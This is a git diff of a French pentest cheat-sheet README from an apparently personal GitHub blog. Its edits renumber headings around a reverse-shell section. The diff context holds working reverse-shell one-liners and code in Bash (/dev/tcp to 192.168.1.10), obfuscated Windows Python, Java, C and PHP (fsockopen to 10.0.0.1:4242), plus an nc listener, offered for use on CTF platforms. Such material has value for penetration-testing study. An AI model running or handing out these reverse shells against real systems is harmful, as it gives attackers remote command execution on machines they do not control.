@@ -1,17 +1,17 @@
 # Xender ?
-Bienvenue à vous sur mon blog GitHub, ou je publie mes multiple Scripts et programmes liée à la CyberSec, test et explication de nouvelles menace [CVE](https://cve.mitre.org/) il represente une aide memoire et bien plus. Vous pouvez me contacter et savoir plus sur mes réseaux [Facebook](https://www.facebook.com/Ghiles.MAHLEB/ "Facebook"), [Linkedin](https://www.linkedin.com/in/ghiles-mahleb-600619188/ "Linkedin").
+Bienvenue sur mon blog GitHub, ou je publie mes multiple Scripts et programmes liée à la CyberSec, test et explication de nouvelles menace [CVE](https://cve.mitre.org/) il represente une aide memoire et bien plus. Vous pouvez me contacter et savoir plus sur mes réseaux [Facebook](https://www.facebook.com/Ghiles.MAHLEB/ "Facebook"), [Linkedin](https://www.linkedin.com/in/ghiles-mahleb-600619188/ "Linkedin").
 
 La plupart des pentest vont se faire sur des plateforme comme [HTB](https://app.hackthebox.eu/ "Hack The Box"), [THM](https://tryhackme.com/ "TryHackMe"). vous pouvez me trouver aussi sur [Hack The Box](https://app.hackthebox.eu/profile/240886 "Xender")
 
-## Cheat sheet
+## 1 Cheat sheet
 
 Cette partie est pour but de vous aider sans trop de BlaBla 
 
-### Reverse Shell
+### 1.1 Reverse Shell
 
 ![](https://xnderlan.github.io/Xender/img/king-net_-pentest-using_-kali_-bindshell.png)
 
-#### Bash
+#### 1.1.1 Bash
 
 ```bash
 Target:
@@ -19,7 +19,7 @@ bash -i >& /dev/tcp/192.168.1.10/1290 0>&1
 Listner:
 nc -lnvp 1290
 ```
-#### Python
+#### 1.1.2 Python
 
 Linux only
 
@@ -48,7 +48,7 @@ Windows only
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 
-#### Java
+#### 1.1.3 Java
 
 ```java
 r = Runtime.getRuntime()
@@ -57,11 +57,11 @@ p.waitFor()
 
 ```
 
-### C
+### 1.1.4 C
 
 Compile with `gcc /tmp/shell.c --output csh && csh`
 
-```csharp
+```c
 #include <stdio.h>
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -92,7 +92,7 @@ int main(void){
 }
 ```
 
-### PHP
+### 1.1.5 PHP
 
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -103,7 +103,7 @@ php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
 php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 ```
 
-## SPAWN TTY 
+## 1.2 SPAWN TTY 
 
 Spawner la TTY apres avoir eu un accès
 
